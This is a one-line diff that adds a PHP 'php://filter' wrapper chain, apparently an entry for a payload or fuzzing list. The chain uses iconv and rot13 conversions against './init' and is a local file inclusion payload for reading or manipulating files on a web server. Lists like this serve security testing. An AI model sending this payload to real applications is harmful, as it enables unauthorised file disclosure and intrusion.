@@ -1,0 +1,1 @@
+php://filter/convert.iconv.ISO-2022-KR.UTF-16|convert.iconv.ISO-8859-2.UTF-16|string.rot13/resource=./init
